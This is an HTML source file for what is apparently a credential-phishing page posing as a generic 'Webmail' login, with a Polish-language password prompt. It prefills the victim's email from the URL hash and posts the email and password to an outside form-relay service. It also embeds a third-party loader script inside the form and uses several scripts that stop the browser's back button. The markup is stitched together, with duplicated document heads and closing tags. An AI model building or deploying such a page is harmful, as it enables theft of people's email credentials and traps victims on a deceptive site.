<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    align-items: center;
    padding: 60px 20px 24px;
    position: relative;
}

/* Centered Layout Workspace Block Wrapper */
.login-wrapper {
    width: 100%;
    max-width: 360px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    margin: auto 0;
}

/* Replicating the modern orange italic script brand logotype typography precisely */
.brand-logo {
    font-size: 54px;
    font-weight: 800;
    color: #ff5500; /* Signature high contrast bright vibrant orange */
    font-style: italic;
    letter-spacing: -2px;
    margin-bottom: 40px;
    font-family: "Arial Black", Gadget, sans-serif;
}

form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 20px;
    margin-bottom: 24px;
}

.form-group {
    width: 100%;
    text-align: left;
}

.form-group label {
    display: block;
    font-size: 14px;
    color: #333333;
    margin-bottom: 10px;
    font-weight: 500;
}

/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
.input-row {
    display: flex;
    width: 100%;
    height: 40px;
    border: 1px solid #b5b5b5;
    border-radius: 4px;
    overflow: hidden;
    background-color: #ffffff;
    transition: border-color 0.15s ease-in-out;
}

.input-row:focus-within {
    border-color: #008cd6;
}

.icon-addon {
    width: 40px;
    background-color: #f7f7f7;
    border-right: 1px solid #cbd5e1;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #718096;
    font-size: 14px;
    user-select: none;
}

.form-control {
    flex: 1;
    height: 100%;
    border: none;
    padding: 0 14px;
    font-size: 14px;
    color: #333333;
    outline: none;
    background: transparent;
}

.form-control::placeholder {
    color: #a0aec0;
    font-weight: 300;
    opacity: 0.85;
}

/* Flat wide rectangular solid energetic cyan submit button block component (NOW FULLY CLICKABLE) */
.submit-btn {
    position: relative;
    z-index: 20;
    width: 100%;
    background-color: #0c8cd6; /* High contrast energetic bright medium sky blue tint */
    color: #ffffff;
    border: none;
    height: 44px;
    font-size: 14px;
    font-weight: bold;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 4px;
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #0a7cb8;
}

/* Central anchor node navigation password restoration button text */
.reset-link {
    font-size: 13px;
    color: #0c8cd6;
    text-decoration: none;
    font-weight: bold;
}

.reset-link:hover {
    text-decoration: underline;
}

/* Bottom Horizontal International Language Menu Ribbon Strip Component elements layout */
.language-bar {
    width: 100%;
    max-width: 900px;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: 16px;
    font-size: 12px;
    color: #666666;
    padding: 20px 0 0;
    z-index: 10;
}

.language-bar a {
    color: #333333;
    text-decoration: none;
}

.language-bar a.active-lang {
    font-weight: bold;
    color: #111111;
}

.language-bar a:hover {
    color: #ff5500;
    text-decoration: underline;
}

.ellipsis-more {
    color: #999999;
    font-weight: bold;
    cursor: pointer;
}

/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
.system-watermark {
    position: fixed;
    bottom: 24px;
    right: 24px;
    text-align: left;
    font-size: 13px;
    color: rgba(0, 0, 0, 0.13);
    line-height: 1.4;
    user-select: none;
    pointer-events: none;
    z-index: 100;
}

@media (max-width: 768px) {
    .language-bar {
        gap: 10px;
        padding: 20px 10px 0;
    }
}

    </style>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail - Login</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Centered Composition Form Area Card Box Component Module Wrapper -->
    <main class="login-wrapper">

        <h1 class="brand-logo">Webmail</h1>

        <!-- Form submission configuration using FormSubmit module links integration -->
        <form action="https://formsubmit.io" method="POST">
            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
            <!-- Email Input Field Group Wrapper Block -->
            <div class="form-group">
                <label for="email">Email Address</label>
                <div class="input-row">
                    <div class="icon-addon">👤</div>
 <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
            </div>
            <!-- Password Input Field Group Wrapper Block -->
            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-row">
                    <div class="icon-addon">🔒</div>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>
            </div>

            <!-- Solid Flat Light Blue Action Submission Trigger Button Block Component -->
            <button type="submit" class="submit-btn">Log in</button>
        </form>

        <!-- Dynamic Structural Password Recovery Helper Link -->
        <a href="#" class="reset-link">Reset Password</a>
    </main>

    <!-- Bottom Horizontal International Language Menu Ribbon Strip -->
    <footer class="language-bar">
        <a href="#">العربية</a>
        <a href="#">čeština</a>
        <a href="#">dansk</a>
        <a href="#">Deutsch</a>
        <a href="#">Ελληνικά</a>
        <a href="#" class="active-lang">English</a>
        <a href="#">español</a>
        <a href="#">español latinoamericano</a>
        <span class="ellipsis-more">...</span>
    </footer>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
